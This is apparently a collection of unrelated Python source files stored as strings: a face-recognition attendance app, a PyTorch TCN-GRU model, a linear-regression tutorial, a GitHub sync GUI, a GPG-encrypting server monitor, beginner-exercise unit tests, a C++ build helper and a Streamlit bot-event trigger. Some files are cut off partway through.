    "import cv2\nimport os\nfrom flask import Flask, request, render_template\nfrom datetime import date\nfrom datetime import datetime\nimport numpy as np\nfrom sklearn.neighbors import KNeighborsClassifier\nimport pandas as pd\nimport joblib\n\napp = Flask(__name__)\n\nnimgs = 10\n\nimgBackground=cv2.imread(\"background.png\")\n\ndatetoday = date.today().strftime(\"%m_%d_%y\")\ndatetoday2 = date.today().strftime(\"%d-%B-%Y\")\n\n\nface_detector = cv2.CascadeClassifier('haarcascade_frontalface_default.xml')\n\n\nif not os.path.isdir('Attendance'):\n    os.makedirs('Attendance')\nif not os.path.isdir('static'):\n    os.makedirs('static')\nif not os.path.isdir('static/faces'):\n    os.makedirs('static/faces')\nif f'Attendance-{datetoday}.csv' not in os.listdir('Attendance'):\n    with open(f'Attendance/Attendance-{datetoday}.csv', 'w') as f:\n        f.write('Name,Roll,Time')\n\ndef totalreg():\n    return len(os.listdir('static/faces'))\n\ndef extract_faces(img):\n    try:\n        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n        face_points = face_detector.detectMultiScale(gray, 1.2, 5, minSize=(20, 20))\n        return face_points\n    except:\n        return []\n\ndef identify_face(facearray):\n    model = joblib.load('static/face_recognition_model.pkl')\n    return model.predict(facearray)\n\n\ndef train_model():\n    faces = []\n    labels = []\n    userlist = os.listdir('static/faces')\n    for user in userlist:\n        for imgname in os.listdir(f'static/faces/{user}'):\n            img = cv2.imread(f'static/faces/{user}/{imgname}')\n            resized_face = cv2.resize(img, (50, 50))\n            faces.append(resized_face.ravel())\n            labels.append(user)\n    faces = np.array(faces)\n    knn = KNeighborsClassifier(n_neighbors=5)\n    knn.fit(faces, labels)\n    joblib.dump(knn, 'static/face_recognition_model.pkl')\n\ndef extract_attendance():\n    df = pd.read_csv(f'Attendance/Attendance-{datetoday}.csv')\n    names = df['Name']\n    rolls = df['Roll']\n    times = df['Time']\n    l = len(df)\n    return names, rolls, times, l\n\ndef add_attendance(name):\n    username = name.split('_')[0]\n    userid = name.split('_')[1]\n    current_time = datetime.now().strftime(\"%H:%M:%S\")\n\n    df = pd.read_csv(f'Attendance/Attendance-{datetoday}.csv')\n    if int(userid) not in list(df['Roll']):\n        with open(f'Attendance/Attendance-{datetoday}.csv', 'a') as f:\n            f.write(f'\\n{username},{userid},{current_time}')\n\ndef getallusers():\n    userlist = os.listdir('static/faces')\n    names = []\n    rolls = []\n    l = len(userlist)\n\n    for i in userlist:\n        name, roll = i.split('_')\n        names.append(name)\n        rolls.append(roll)\n\n    return userlist, names, rolls, l\n\n\n@app.route('/')\ndef home():\n    names, rolls, times, l = extract_attendance()\n    return render_template('home.html', names=names, rolls=rolls, times=times, l=l, totalreg=totalreg(), datetoday2=datetoday2)\n\n@app.route('/start', methods=['GET'])\ndef start():\n    names, rolls, times, l = extract_attendance()\n\n    if 'face_recognition_model.pkl' not in os.listdir('static'):\n        return render_template('home.html', names=names, rolls=rolls, times=times, l=l, totalreg=totalreg(), datetoday2=datetoday2, mess='There is no trained model in the static folder. Please add a new face to continue.')\n\n    ret = True\n    cap = cv2.VideoCapture(0)\n    while ret:\n        ret, frame = cap.read()\n        if len(extract_faces(frame)) > 0:\n            (x, y, w, h) = extract_faces(frame)[0]\n            cv2.rectangle(frame, (x, y), (x+w, y+h), (86, 32, 251), 1)\n            cv2.rectangle(frame, (x, y), (x+w, y-40), (86, 32, 251), -1)\n            face = cv2.resize(frame[y:y+h, x:x+w], (50, 50))\n            identified_person = identify_face(face.reshape(1, -1))[0]\n            add_attendance(identified_person)\n            cv2.rectangle(frame, (x,y), (x+w, y+h), (0,0,255), 1)\n            cv2.rectangle(frame,(x,y),(x+w,y+h),(50,50,255),2)\n            cv2.rectangle(frame,(x,y-40),(x+w,y),(50,50,255),-1)\n            cv2.putText(frame, f'{identified_person}', (x,y-15), cv2.FONT_HERSHEY_COMPLEX, 1, (255,255,255), 1)\n            cv2.rectangle(frame, (x,y), (x+w, y+h), (50,50,255), 1)\n        imgBackground[162:162 + 480, 55:55 + 640] = frame\n        cv2.imshow('Attendance', imgBackground)\n        if cv2.waitKey(1) == 27:\n            break\n    cap.release()\n    cv2.destroyAllWindows()\n    names, rolls, times, l = extract_attendance()\n    return render_template('home.html', names=names, rolls=rolls, times=times, l=l, totalreg=totalreg(), datetoday2=datetoday2)\n\n\n\n@app.route('/add', methods=['GET', 'POST'])\ndef add():\n    newusername = request.form['newusername']\n    newuserid = request.form['newuserid']\n    userimagefolder = 'static/faces/'+newusername+'_'+str(newuserid)\n    if not os.path.isdir(userimagefolder):\n        os.makedirs(userimagefolder)\n    i, j = 0, 0\n    cap = cv2.VideoCapture(0)\n    while 1:\n        _, frame = cap.read()\n        faces = extract_faces(frame)\n        for (x, y, w, h) in faces:\n            cv2.rectangle(",
    "import numpy as np\r\nimport torch\r\nimport torch.nn as nn\r\nfrom torch.nn.utils import weight_norm\r\n\r\nclass Chomp1d(nn.Module):\r\n    def __init__(self, chomp_size):\r\n        super(Chomp1d, self).__init__()\r\n        self.chomp_size = chomp_size\r\n\r\n    def forward(self, x):\r\n        return x[:, :, :-self.chomp_size].contiguous()\r\n\r\n\r\nclass TemporalBlock(nn.Module):\r\n    def __init__(self, n_inputs, n_outputs, kernel_size, stride, dilation, padding, dropout=0.2):\r\n        \"\"\"\r\n        \u76f8\u5f53\u4e8e\u4e00\u4e2aResidual block\r\n\r\n        :param n_inputs: int, Number of input channels\r\n        :param n_outputs: int, int, Number of output channels\r\n        :param kernel_size: int, The size of convolutional kernel\r\n        :param stride: int\r\n        :param dilation: int\r\n        :param padding: int\r\n        :param dropout: float\r\n        \"\"\"\r\n        super(TemporalBlock, self).__init__()\r\n        self.conv1 = weight_norm(nn.Conv1d(n_inputs, n_outputs, kernel_size,\r\n                                           stride=stride, padding=padding, dilation=dilation))\r\n        self.chomp1 = Chomp1d(padding)\r\n        self.relu1 = nn.ReLU()\r\n        self.dropout1 = nn.Dropout(dropout)\r\n\r\n        self.conv2 = weight_norm(nn.Conv1d(n_outputs, n_outputs, kernel_size,\r\n                                           stride=stride, padding=padding, dilation=dilation))\r\n        self.chomp2 = Chomp1d(padding)  \r\n        self.relu2 = nn.ReLU()\r\n        self.dropout2 = nn.Dropout(dropout)\r\n\r\n        self.net = nn.Sequential(self.conv1, self.chomp1, self.relu1, self.dropout1,\r\n                                 self.conv2, self.chomp2, self.relu2, self.dropout2)\r\n        self.downsample = nn.Conv1d(n_inputs, n_outputs, 1) if n_inputs != n_outputs else None\r\n        self.relu = nn.ReLU()\r\n        self.init_weights()\r\n\r\n    def init_weights(self):\r\n\r\n        self.conv1.weight.data.normal_(0, 0.01)\r\n        self.conv2.weight.data.normal_(0, 0.01)\r\n        if self.downsample is not None:\r\n            self.downsample.weight.data.normal_(0, 0.01)\r\n\r\n    def forward(self, x):\r\n\r\n        out = self.net(x)\r\n        res = x if self.downsample is None else self.downsample(x)\r\n        return self.relu(out + res)\r\n\r\n\r\nclass TemporalConvNet_GRU(nn.Module):\r\n    def __init__(self, num_inputs=4, num_channels=[32, 32, 32, 32], kernel_size=3, dropout=0):\r\n        \"\"\"\r\n        :param num_inputs: int\uff0c Number of input channels\r\n        :param num_channels: list\uff0cNumber of hidden channel in each layer\r\n        :param kernel_size: int\r\n        :param dropout: float\r\n        \"\"\"\r\n        super(TemporalConvNet_GRU, self).__init__()\r\n        layers = []\r\n        num_levels = len(num_channels)\r\n        for i in range(num_levels):\r\n            dilation_size = 2 ** i  \r\n            in_channels = num_inputs if i == 0 else num_channels[i - 1]  \r\n            out_channels = num_channels[i] \r\n            layers += [TemporalBlock(in_channels, out_channels, kernel_size, stride=1, dilation=dilation_size,\r\n                                     padding=(kernel_size - 1) * dilation_size, dropout=dropout)]\r\n\r\n        self.network = nn.Sequential(*layers)\r\n        self.gru = nn.GRU(32, 32, 1, batch_first=True)\r\n        self.linear = nn.Linear(num_channels[-1], 6)\r\n\r\n    def forward(self, x):\r\n        \"\"\"\r\n        :param x: size of (Batch, input_channel, seq_len)\r\n        :return: size of (Batch, output_channel, seq_len)\r\n        \"\"\"\r\n        x = x.permute(0, 2, 1)\r\n        out = self.network(x)\r\n        gru_input = out.permute(0, 2, 1)\r\n        output,hn = self.gru(gru_input)\r\n        return out[:, :, -1]\r\n",
    "# Simple Linear Regression\n\n# Importing the libraries\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport pandas as pd\n\n# Importing the dataset\ndataset = pd.read_csv('Salary_Data.csv')\nX = dataset.iloc[:, :-1].values\ny = dataset.iloc[:, -1].values\n\n# Splitting the dataset into the Training set and Test set\nfrom sklearn.model_selection import train_test_split\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 1/3, random_state = 0)\n\n# Training the Simple Linear Regression model on the Training set\nfrom sklearn.linear_model import LinearRegression\nregressor = LinearRegression()\nregressor.fit(X_train, y_train)\n\n# Predicting the Test set results\ny_pred = regressor.predict(X_test)\n\n# Visualising the Training set results\nplt.scatter(X_train, y_train, color = 'red')\nplt.plot(X_train, regressor.predict(X_train), color = 'blue')\nplt.title('Salary vs Experience (Training set)')\nplt.xlabel('Years of Experience')\nplt.ylabel('Salary')\nplt.show()\n\n# Visualising the Test set results\nplt.scatter(X_test, y_test, color = 'red')\nplt.plot(X_train, regressor.predict(X_train), color = 'blue')\nplt.title('Salary vs Experience (Test set)')\nplt.xlabel('Years of Experience')\nplt.ylabel('Salary')\nplt.show()",
    "import os\nimport datetime\nimport time\nimport configparser\nimport git\nfrom git import Repo, InvalidGitRepositoryError, GitCommandError\nfrom flask import Flask, request\nfrom threading import Thread\nimport tkinter as tk\nfrom tkinter import ttk, scrolledtext, simpledialog, filedialog\nglobal gui\n\napp = Flask(__name__)\n\nclass SyncGUI:\n    def __init__(self):\n        self.window = tk.Tk()\n        self.window.title(\"GitHub Repository Synchronization Tool\")\n\n        config = configparser.ConfigParser()\n        config.read('config.ini')\n\n        self.repo_url = config.get('repository', 'url', fallback='')\n        self.local_path = config.get('repository', 'local_path', fallback='')\n        self.branch = config.get('repository', 'branch', fallback='')\n        self.log_file = config.get('settings', 'log_file', fallback='')\n        self.is_private_repo = config.getboolean('repository', 'is_private', fallback=False)\n        self.access_token = config.get('settings', 'access_token', fallback='')\n\n        self.create_widgets()\n        self.load_config()\n\n    def load_config(self):\n        self.url_entry.delete(0, tk.END)\n        self.url_entry.insert(0, self.repo_url)\n\n        self.local_path_entry.delete(0, tk.END)\n        self.local_path_entry.insert(0, self.local_path)\n\n        self.branch_entry.delete(0, tk.END)\n        self.branch_entry.insert(0, self.branch)\n\n        self.log_file_entry.delete(0, tk.END)\n        self.log_file_entry.insert(0, self.log_file)\n\n        self.is_private_var.set(self.is_private_repo)\n\n        self.access_token_entry.delete(0, tk.END)\n        self.access_token_entry.insert(0, self.access_token)\n\n    def save_config(self):\n        self.update_config()\n        self.display_output(\"Configuration saved.\")\n\n    def run(self):\n        self.window.mainloop()\n\n    def create_widgets(self):\n        main_frame = ttk.Frame(self.window)\n        main_frame.pack(padx=10, pady=10)\n\n        # Repository Information\n        info_frame = ttk.LabelFrame(main_frame, text=\"Repository Information\")\n        info_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)\n\n        ttk.Label(info_frame, text=\"URL:\").grid(row=0, column=0, sticky=tk.W)\n        self.url_entry = ttk.Entry(info_frame, width=50)\n        self.url_entry.grid(row=0, column=1, sticky=tk.W)\n\n        ttk.Label(info_frame, text=\"Local Path:\").grid(row=1, column=0, sticky=tk.W)\n        self.local_path_entry = ttk.Entry(info_frame, width=50)\n        self.local_path_entry.grid(row=1, column=1, sticky=tk.W)\n        ttk.Button(info_frame, text=\"Browse\", command=self.browse_local_path).grid(row=1, column=2, padx=5)\n\n        ttk.Label(info_frame, text=\"Branch:\").grid(row=2, column=0, sticky=tk.W)\n        self.branch_entry = ttk.Entry(info_frame, width=50)\n        self.branch_entry.grid(row=2, column=1, sticky=tk.W)\n\n        ttk.Label(info_frame, text=\"Log File:\").grid(row=3, column=0, sticky=tk.W)\n        self.log_file_entry = ttk.Entry(info_frame, width=50)\n        self.log_file_entry.grid(row=3, column=1, sticky=tk.W)\n\n        self.is_private_var = tk.BooleanVar()\n        ttk.Checkbutton(info_frame, text=\"Private Repository\", variable=self.is_private_var).grid(row=4, column=0, sticky=tk.W)\n\n        ttk.Label(info_frame, text=\"Access Token:\").grid(row=5, column=0, sticky=tk.W)\n        self.access_token_entry = ttk.Entry(info_frame, width=50, show=\"*\")\n        self.access_token_entry.grid(row=5, column=1, sticky=tk.W)\n\n        # Add the \"Save Config\" button\n        save_config_button = ttk.Button(info_frame, text=\"Save Config\", command=self.save_config)\n        save_config_button.grid(row=6, column=1, padx=5, pady=5)\n\n        # Actions\n        actions_frame = ttk.LabelFrame(main_frame, text=\"Actions\")\n        actions_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)\n\n        ttk.Button(actions_frame, text=\"Start Monitoring\", command=self.start_monitoring).grid(row=0, column=0, padx=5, pady=5)\n        ttk.Button(actions_frame, text=\"Perform One-Time Synchronization\", command=self.sync_repo).grid(row=0, column=1, padx=5, pady=5)\n        ttk.Button(actions_frame, text=\"Display Sync History\", command=self.display_sync_history).grid(row=1, column=0, padx=5, pady=5)\n        ttk.Button(actions_frame, text=\"Display Last Synchronization Status\", command=self.display_last_sync_status).grid(row=1, column=1, padx=5, pady=5)\n        ttk.Button(actions_frame, text=\"Display Repository Information\", command=self.display_repo_info).grid(row=2, column=0, padx=5, pady=5)\n        ttk.Button(actions_frame, text=\"Display Commit History\", command=self.display_commit_history).grid(row=3, column=0, padx=5, pady=5)\n        ttk.Button(actions_frame, text=\"Display Branch List\", command=self.display_branch_list).grid(row=3, column=1, padx=5, pady=5)\n        ttk.Button(actions_frame, text=\"Display File Changes for a Commit\", command=self.display_file_changes).grid(row=4, column=0, padx=5, pady=5)\n\n        # Output\n        output_frame = ttk.LabelFrame(main_frame, text=\"Output\")\n     ",
    "##### PyMonG\n##### (c) 2024 Giovambattista Vieri All Rigths Reserved\n##### License Affero GPL. \n\n\n\n# free -m \n# vmstat \n# df \n# lscpu \n# mpstat\n# iostat\n\n# nstat\n# ss\n# netstat -1\n# ip -s link\n# arpwatch\n##############\n\nimport sys\nimport gnupg\nimport base64\nimport pprint\n\n\ncommands=[\"free -m\",\n#          \"vmstat\",\n#          \"lscpu\",\n#          \"mpstat\",\n#          \"iostat\",\n#          \"nstat\",\n#          \"ss\",\n#          \"netstat -l\",\n#          \"ip -s link\",\n#          \"arpwatch\",\n          \"df -k\"]\n\n\nimport os \nimport subprocess\nimport argparse\n\n\ndefaultkey='testgpg@example.com'\n\ndef getOptions(args=sys.argv[1:]):\n    parser=argparse.ArgumentParser(description='This simple program will help you to write an encrypted monitor about a server status. The resulting string is printed on stdout and can be sent via mqtt or smtp, etc..',epilog='Example of use:')\n    parser.add_argument('-v','--verbose', help='more verbose output', action='store_true')\n    parser.add_argument('-a','--archive', help='archive report in files in ~./repo_path ', action='store_true')\n    parser.add_argument('-k','--key', help='choose gpg key to use', default=defaultkey, action='store_true')\n    opt=parser.parse_args(args)\n    return(opt)\n\nopt=getOptions()\nverbose=opt.verbose\narchive=opt.archive\nenc_key=opt.key\n\nres=\"\"\nfor c in commands:\n    r=subprocess.check_output(c,shell=True)\n    res=res+\"---\"+c+\"---\\n\"+r.decode(\"ascii\")\n\n###########\n### print(res)\n##########\n\n\n\n\nrecipient_key=[enc_key]\npath= os.getcwd()\ngpg=gnupg.GPG(gnupghome=path+'/.gnupg')\npublic_keys = gpg.list_keys() \n\nif (verbose):\n    for pk in public_keys:\n        print(pk['uids'])\n    print (\"--------------------------\")\n\nif(archive):\n    file_path=\"/prova1.txt\"\n    repo_path=\"./repo_path\"\n    if not os.path.exists(repo_path):\n        os.makedirs(repo_path)\n\n    file=\".\"+file_path\n    print(\"--------------\",file)\n\n    output_path=repo_path+file_path\n    print(\"--------------\",output_path)\n\ntry:\n###    status = gpg.encrypt_file(\n####        file_data,\n###        res,\n###        recipients=recipient_key,\n###        output=output_path + '.pgp',\n###        always_trust = True\n###    )\n    encrypted_ascii_data= gpg.encrypt(res,\n        recipients=recipient_key,\n        always_trust = True\n    )\nexcept Exception as e:\n    print (\"---- exception ----\")\n    print (e)\n\nprint (encrypted_ascii_data)\n",
    "\"\"\" Exercise 1 Test \"\"\"\n\nimport io\nimport sys\nimport unittest\nimport os\nfrom ex_1 import BeginnerExercises\n\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), \"..\")))\n\n\nclass TestBeginnerExercises(unittest.TestCase):\n    \"\"\"Test Beginner Exercises\"\"\"\n\n    def setUp(self):\n        \"\"\"Set up the test fixture before each test method.\"\"\"\n        self.exercises = BeginnerExercises()\n\n    def test_is_palindrome(self):\n        \"\"\"Test the is_palindrome method.\"\"\"\n        self.assertEqual(self.exercises.is_palindrome(\"racecar\"), \"is a palindrome\")\n        self.assertEqual(self.exercises.is_palindrome(\"hello\"), \"is not a palindrome\")\n        self.assertEqual(self.exercises.is_palindrome(\"Madam\"), \"is a palindrome\")\n        self.assertEqual(\n            self.exercises.is_palindrome(\"A man, a plan, a canal, Panama!\"),\n            \"is a palindrome\",\n        )\n        self.assertEqual(\n            self.exercises.is_palindrome(\"No 'x' in Nixon\"), \"is a palindrome\"\n        )\n        self.assertEqual(self.exercises.is_palindrome(\"\"), \"is a palindrome\")\n\n    def test_fizzbuzz(self):\n        \"\"\"Test the fizzbuzz method.\"\"\"\n        # Capture the output of fizzbuzz to a string\n\n        code_output = io.StringIO()  # Create StringIO object\n        sys.stdout = code_output  # Redirect stdout.\n        self.exercises.fizzbuzz()  # Call function.\n        sys.stdout = sys.__stdout__  # Reset redirect.\n\n        # Check the first few lines of the output\n        lines = code_output.getvalue().split(\"\\n\")\n        self.assertEqual(lines[0], \"1\")\n        self.assertEqual(lines[2], \"fizz\")\n        self.assertEqual(lines[4], \"buzz\")\n        self.assertIn(\"fizzbuzz\", lines)  # Ensure fizzbuzz is in the output\n\n    def test_find_max(self):\n        \"\"\"Test the find_max method.\"\"\"\n        self.assertEqual(self.exercises.find_max([1, 3, 2]), 3)\n        self.assertEqual(self.exercises.find_max([-10, -20, -30]), -10)\n        self.assertEqual(self.exercises.find_max([10]), 10)\n        self.assertEqual(self.exercises.linear_search([1, 4, 5, 5, 7], 5), 2)\n        self.assertEqual(self.exercises.find_max([1, 3, 3, 2]), 3)\n        self.assertEqual(self.exercises.find_max([-10, -10, -20, -30]), -10)\n        self.assertEqual(self.exercises.find_max([7, 7, 7, 7]), 7)\n\n    def test_linear_search(self):\n        \"\"\"Test the linear_search method.\"\"\"\n        self.assertEqual(self.exercises.linear_search([1, 4, 5, 2, 7], 5), 2)\n        self.assertEqual(self.exercises.linear_search([1, 4, 5, 2, 7], 3), -1)\n        self.assertEqual(self.exercises.linear_search([], 1), -1)\n        self.assertEqual(self.exercises.linear_search([-1, -4, -5, -2, -7], -5), 2)\n        self.assertEqual(self.exercises.linear_search([-1, -4, -5, -2, -7], 1), -1)\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n",
    "import pickle, os, sys\n\n########## CONFIG ##########\nsrc_dir : str = \"src/\"\nlib_dir : str = \"lib/\"\nbin_dir : str = \"bin/\"\nintermediate_dir : str = \"intermediate/\"\n\nmain_file : str = \"main.cpp\"\nexecutable_file : str = \"main\"\n\ntracking_file : str = \"tracking_builds.bin\"\n############################\n\narguments : list[str] = sys.argv\n\nclass File:\n    def __init__(self, name : str = \"\", extension : str = \"cpp\"):\n        self.last_time_edit : int = 0\n        self.name : str = name\n        self.extension : str = extension\n    def check_compile(self, libs) -> bool:\n        current_time_edit : int = os.path.getmtime(src_dir + self.name + \".\" + self.extension)\n        if self.last_time_edit != current_time_edit or not os.path.exists(intermediate_dir+self.name+\".o\"):\n            self.last_time_edit = current_time_edit\n            os.system(f\"g++ {src_dir + self.name}.{self.extension} -o {intermediate_dir + self.name}.o -c {libs} -I{lib_dir}\")\n            return True\n        return False\n    def exists(self) -> bool:\n        if os.path.exists(src_dir + self.name + \".\" + self.extension):\n            return True\n        return False\n\nlibs : str = \"\"\nfiles : list[File] = []\n\ndef load_tracking_file() -> None:\n    global libs, files\n    file = open(tracking_file, \"rb\")\n    libs, files = pickle.load(file)\n    file.close()\n\ndef save_tracking_file() -> None:\n    file = open(tracking_file, \"wb\")\n    obj = [libs, files]\n    pickle.dump(obj, file)\n    file.close()\n\ndef link() -> None:\n    files_string : str = \"\"\n    for file in files:\n        files_string += intermediate_dir + file.name + \".o \"\n    os.system(f\"g++ {files_string}-o {bin_dir}{executable_file} {libs} -I{lib_dir}\")\n\ndef append_lib(lib : str) -> None:\n    global libs\n    if not (f\"-l{lib}\" in libs.split(\" \")):\n        libs += f\"-l{lib} \"\n        return\n    print(f\"failed to append the library {lib}, already keeping track of it\")\n\ndef remove_lib(lib : str) -> None:\n    global libs\n    if not f\"-l{lib} \" in libs:\n        print(f\"not keeping track of any lib called '{lib}'.\")\n        return\n    libs = libs.replace(f\"-l{lib} \", \"\")\n\ndef clear_unexistant_files() -> None:\n    for i, file in enumerate(files):\n        if not file.exists():\n            del files[i]\n\ndef append_file(file : str) -> None:\n    global files\n    name, extension = file.split(\".\")\n    for c_file in files:\n        if name == c_file.name and extension == c_file.extension:\n            print(f\"failed to append the file {file}, already keeping track of it.\")\n            return\n    files.append(File(name, extension))\n\ndef remove_file(file : str) -> None:\n    name, extension = file.split(\".\")\n    for i, c_file in enumerate(files):\n        if c_file.name == name and c_file.extension == extension:\n            del files[i]\n            return\n    print(f\"not keeping track of any file called {file}.\")\n\nif not os.path.exists(tracking_file):\n    temp_file = open(tracking_file, \"x\")\n    temp_file.close()\n\nwith open(tracking_file, \"rb\") as f:\n    if f.readlines() != []:\n        load_tracking_file()\n\nclear_unexistant_files()\n\nif files == []:\n    append_file(main_file)\n\nmatch arguments[1]:\n    case \"run\":\n        anything_compiled = False\n        for file in files:\n            if file.check_compile(libs):\n                anything_compiled = True\n        if anything_compiled or (not(os.path.exists(bin_dir+executable_file))):\n            link()\n        os.system(bin_dir + executable_file)\n    case \"append\":\n        append_file(arguments[2])\n    case \"remove\":\n        remove_file(arguments[2])\n    case \"lib\":\n        if arguments[2] != \"-r\":\n            append_lib(arguments[2])\n        else :\n            remove_lib(arguments[3])\n    case \"comp\":\n        for file in files:\n            file.check_compile(libs)\n        link()\n\nsave_tracking_file()\n",
    "import io\nfrom datetime import datetime, timedelta\nimport streamlit as st\nimport requests\nimport zipfile\nimport json\nimport pandas as pd\nfrom time import sleep\n\n\nst.set_page_config(page_title=\"\u26a1\u0417\u0430\u043f\u0443\u0441\u043a \u0442\u0440\u0438\u0433\u0433\u0435\u0440\u0430 \u0431\u043e\u0442\u0430\")\nst.title(\"\u26a1\u0417\u0430\u043f\u0443\u0441\u043a \u0442\u0440\u0438\u0433\u0433\u0435\u0440\u0430 \u0431\u043e\u0442\u0430\")\n\n\nst.sidebar.header(\"\u041f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\")\nbase_url = st.sidebar.text_input(\n    \"\u0411\u0430\u0437\u043e\u0432\u044b\u0439 URL:\", placeholder=\"\u0410\u0434\u0440\u0435\u0441 \u0441\u0442\u0435\u043d\u0434\u0430\", value=\"https://client.elma-bot.ai\"\n)\nbot_id = st.sidebar.text_input(\n    \"\u0418\u0434\u0435\u043d\u0442\u0438\u0444\u0438\u043a\u0430\u0442\u043e\u0440 \u0431\u043e\u0442\u0430:\", placeholder=\"\u041e\u0442\u043a\u0440\u044b\u0442\u044c \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0431\u043e\u0442\u043e\u0432 > \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438 > API\"\n)\nxtoken = st.sidebar.text_input(\n    \"X-Token\", placeholder=\"\u041e\u0442\u043a\u0440\u044b\u0442\u044c \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0431\u043e\u0442\u043e\u0432 > \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438 > API\"\n)\n\nevents_list_tab, notify_tab = st.tabs([\"\u0421\u043f\u0438\u0441\u043e\u043a \u0441\u043e\u0431\u044b\u0442\u0438\u0439\", \"\u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c notify\"])\n\nwith events_list_tab:\n\n    get_event_descriptions = st.button(\"\u041f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0441\u043f\u0438\u0441\u043e\u043a \u0441\u043e\u0431\u044b\u0442\u0438\u0439\")\n\n    if get_event_descriptions:\n        if not base_url or not bot_id or not xtoken:\n            st.warning(\"\u041d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e \u0437\u0430\u043f\u043e\u043b\u043d\u0438\u0442\u044c \u0432\u0441\u0435 \u043f\u043e\u043b\u044f\")\n            st.stop()\n        events_list_url = base_url + \"/api/v1/runtime/simple/external/events/\" + bot_id\n        response = requests.get(url=events_list_url, headers={\"X-Token\": xtoken})\n        if response.status_code == 401:\n            st.warning(\"\u041e\u0448\u0438\u0431\u043a\u0430 \u0430\u0432\u0442\u043e\u0440\u0438\u0437\u0430\u0446\u0438\u0438\")\n        elif response.status_code != 200:\n            st.warning(\"\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u0437\u0430\u0433\u0440\u0443\u0437\u0438\u0442\u044c \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044e \u043e \u0441\u043e\u0431\u044b\u0442\u0438\u044f\u0445\")\n            st.write(response)\n        else:\n            events = response.json()\n            st.text(\"\u0421\u043e\u0431\u044b\u0442\u0438\u044f\")\n            for e in events:\n                externalEventId = e[\"externalEventId\"]\n                parameters = e[\"parameters\"]\n                st.markdown(f\"**externalEventId**: {externalEventId}\")\n                st.markdown(f\"**parameters**: {parameters}\")\n                st.divider()\n        # st.write(response.json())\n\n\nwith notify_tab:\n    st.markdown(\"\u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c \u0441\u043e\u0431\u044b\u0442\u0438\u0435 notify \u0441 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u043c notify_text\")\n    notify_text = st.text_area(\"\u0422\u0435\u043a\u0441\u0442 \u0443\u0432\u0435\u0434\u043e\u043c\u043b\u0435\u043d\u0438\u044f\")\n\n    one_conversation = \"\u041e\u0434\u043d\u0430 \u0431\u0435\u0441\u0435\u0434\u0430 (\u043f\u043e id)\"\n    by_date = \"\u0411\u0435\u0441\u0435\u0434\u044b \u0437\u0430 \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u044b\u0439 \u043f\u0435\u0440\u0438\u043e\u0434\"\n    target_type = st.radio(\n        \"\u0410\u0443\u0434\u0438\u0442\u043e\u0440\u0438\u044f\",\n        [one_conversation, \"\u0412\u0441\u0435 \u0431\u0435\u0441\u0435\u0434\u044b\", by_date],\n        captions=[\n            \"\u0443\u0434\u043e\u0431\u043d\u043e \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u0434\u043b\u044f \u043f\u0440\u043e\u0431\u043d\u043e\u0433\u043e \u0437\u0430\u043f\u0443\u0441\u043a\u0430.\",\n            \"\u0415\u0441\u043b\u0438 \u043d\u0443\u0436\u043d\u043e \u0440\u0430\u0437\u043e\u0441\u043b\u0430\u0442\u044c \u0432\u0441\u0435\u043c \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\u043c.\",\n            \"\u0415\u0441\u043b\u0438 \u043d\u0443\u0436\u043d\u043e \u0440\u0430\u0437\u043e\u0441\u043b\u0430\u0442\u044c \u0442\u0435\u043c, \u043a\u0442\u043e \u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f \u0431\u043e\u0442\u043e\u043c \u0432 \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u044b\u0439 \u043f\u0435\u0440\u0438\u043e\u0434 (\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 \u043d\u0435\u0434\u0435\u043b\u044f).\",\n        ],\n    )\n\n    if target_type == one_conversation:\n        conversation_id = st.text_input('id \u0431\u0435\u0441\u0435\u0434\u044b')\n        if run_submited := st.button('\u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c'):\n            if not conversation_id:\n                st.warning('\u041d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c \u0443\u043a\u0430\u0437\u0430\u0442\u044c \u0438\u0434\u0435\u043d\u0442\u0438\u0444\u0438\u043a\u0430\u0442\u043e\u0440 \u0431\u0435\u0441\u0435\u0434\u044b')\n                st.stop()\n            if not notify_text:\n                st.warning('\u041d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c \u0443\u043a\u0430\u0437\u0430\u0442\u044c \u0442\u0435\u043a\u0441\u0442 \u0443\u0432\u0435\u0434\u043e\u043c\u043b\u0435\u043d\u0438\u044f')\n                st.stop()   \n\n            st.info('\u0417\u0430\u043f\u0443\u0441\u043a...')\n            start_event__url = base_url + '/api/v1/runtime/simple/external/events'\n            data = {\n                'conversationId': conversation_id,\n                'externalEventId': 'notify',\n                'externalEventPayload': {\n                    'notify_text': notify_text\n                }\n            }\n            r = requests.post(start_event__url, json=data, headers={\"X-Token\": xtoken, 'Content-Type': 'application/json'})\n            if r.status_code == 200:\n                st.success('\u0421\u043e\u0431\u044b\u0442\u0438\u0435 \u0443\u0441\u043f\u0435\u0448\u043d\u043e 